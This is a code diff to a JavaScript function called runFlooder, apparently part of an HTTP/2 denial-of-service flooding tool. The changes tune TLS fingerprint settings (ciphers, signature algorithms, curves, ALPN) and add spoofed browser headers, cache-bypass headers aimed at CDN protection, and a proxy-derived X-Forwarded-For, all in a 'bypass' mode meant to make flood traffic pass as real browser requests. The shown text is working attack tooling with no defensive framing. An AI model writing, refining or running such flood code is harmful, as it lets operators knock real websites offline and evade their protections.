@@ -216,7 +216,7 @@ function runFlooder() {
         ":path": path,
         'User-Agent': finalUa,
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Language': ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'],
+        'Accept-Language': `'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'`,
         'Accept-Encoding': 'gzip, deflate, br',
         "cache-control": "max-age=0",
         "sec-ch-ua": `"Brave";v="1.58", "Chromium";v="116", "Not_A Brand";v="24"`,
@@ -295,10 +295,21 @@ function runFlooder() {
             if (Math.random() < 0.1) headersbex['Origin'] = 'https://www.google.com/';
         }
                 if (args.bypass) {
+            tlsOptions.secure = true;
             tlsOptions.ALPNProtocols = ['h2'];
-            tlsOptions.maxVersion = 'TLSv1.3';
-            tlsOptions.minVersion = 'TLSv1.2';
             tlsOptions.ciphers = randomElement(cplist);
+            tlsOptions.requestCert = true;
+            tlsOptions.sigalgs = sigalgs;
+            tlsOptions.socket = connection;
+            tlsOptions.ecdhCurve = ecdhCurve;
+            tlsOptions.secureContext = secureContext;
+            tlsOptions.honorCipherOrder = true;
+            tlsOptions.rejectUnauthorized = true;
+            tlsOptions.minVersion = 'TLSv1.2';
+            tlsOptions.maxVersion = 'TLSv1.3';
+            tlsOptions.secureOptions = secureOptions;
+            tlsOptions.host = parsedTarget.host;
+            tlsOptions.servername = parsedTarget.host;
             tlsOptions.dhparam = 'modp4096';
             
             headersbex['User-Agent'] = finalUa;
@@ -309,13 +320,11 @@ function runFlooder() {
             headersbex['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
             headersbex['Accept-Encoding'] = 'gzip, deflate, br';
             headersbex['Accept-Language'] = "en-US,en;q=0.9,vi;q=0.8";
-            headersbex['Pragma'] = 'no-cache';  // Đảm bảo không lưu trữ bộ đệm
-            headersbex['Upgrade-Insecure-Requests'] = '1';  // Cập nhật các yêu cầu không an toàn
-            headersbex['Sec-Fetch-Site'] = 'same-origin';  // Yêu cầu từ cùng một nguồn
-            headersbex['Sec-Fetch-Mode'] = 'navigate';  // Chế độ điều hướng
-            headersbex['Sec-Fetch-Dest'] = 'document';  // Đích đến là tài liệu
-            headersbex['TE'] = 'Trailers';  // Tiếp nhận trailers trong HTTP/2
-            headersbex['Access-Control-Allow-Credentials'] = 'false';
+            headersbex['Pragma'] = 'no-cache';
+            headersbex['Upgrade-Insecure-Requests'] = '1';  
+            headersbex['Sec-Fetch-Site'] = 'same-origin';  
+            headersbex['Sec-Fetch-Mode'] = 'navigate'; 
+            headersbex['Sec-Fetch-Dest'] = 'document'; 
             headersbex['X-Cache'] = 'BYPASS';
             headersbex['CF-Cache-Status'] = 'BYPASS';
             headersbex['X-Forwarded-For'] = parsedProxy[0];
